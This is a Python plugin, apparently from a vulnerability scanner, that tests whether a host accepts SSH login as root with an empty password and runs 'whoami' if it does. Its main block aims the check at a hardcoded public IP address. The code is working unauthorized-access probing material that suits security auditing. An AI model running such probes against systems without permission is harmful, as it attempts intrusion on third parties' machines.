#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-
from lib.poc.Base import POC
import paramiko


class SSHUnauthorized(POC):
    def __init__(self, ip):
        self.ip = ip

    def info(self):
        info = {
            'name': 'SSHUnauthorized',
            'level': 'high',
            'type': 'unauthorized',
        }
        return info

    def check(self):
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            s.connect(hostname=self.ip, port=22, username='root', password='', timeout=5)
            s.exec_command('whoami', timeout=5)
            s.close()
            return True
        except Exception as e:
            return False


if __name__ == '__main__':
    print(SSHUnauthorized(ip='115.159.160.22').check())
